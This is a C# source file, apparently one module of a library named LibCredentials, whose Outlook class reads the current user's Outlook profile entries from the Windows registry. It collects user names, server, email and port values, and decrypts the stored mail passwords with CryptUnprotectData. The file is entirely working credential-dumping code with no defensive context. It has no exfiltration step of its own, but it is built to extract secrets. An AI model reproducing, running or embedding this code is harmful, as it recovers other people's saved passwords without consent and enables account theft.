using System.Collections.Generic;
using System.Linq;
using System.Text;
using LibCredentials.PInvoke;
using Microsoft.Win32;

namespace LibCredentials.Targets
{
    public class Outlook : Target
    {
        protected override void _GetCredentials(List<Credential> credentials)
        {
            var hKey = Registry.CurrentUser.OpenSubKey(
                "SOFTWARE\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676", false);
            if (hKey == null)
                return;

            foreach (var subkeyname in hKey.GetSubKeyNames())
            {
                var subkey = hKey.OpenSubKey(subkeyname);
                if (subkey == null)
                    continue;

                var values = subkey.GetValueNames().ToDictionary(v => v, vn => subkey.GetValue(vn));
                var cred = new Credential(TargetTypes.Outlook) {Extra = ""};
                foreach (var kv in values)
                    if (kv.Key.EndsWith("User"))
                    {
                        cred.Username = Encoding.Unicode.GetString((byte[]) kv.Value).TrimEnd('\0');
                    }
                    else if (kv.Key.EndsWith("Password"))
                    {
                        var data = Crypt32.CryptUnprotectData(((byte[]) kv.Value).Skip(1).ToArray());
                        cred.Password = Encoding.Unicode.GetString(data).TrimEnd('\0');
                    }
                    else if (kv.Key.EndsWith("Server") || (kv.Key == "Email"))
                    {
                        cred.Extra += kv.Key + ": " + Encoding.Unicode.GetString((byte[]) kv.Value).TrimEnd('\0') +
                                      " | ";
                    }
                    else if (kv.Key.EndsWith("Port"))
                    {
                        cred.Extra += kv.Key + ": " + kv.Value + " | ";
                    }

                if (cred.Username != null)
                    credentials.Add(cred);
            }
        }
    }
}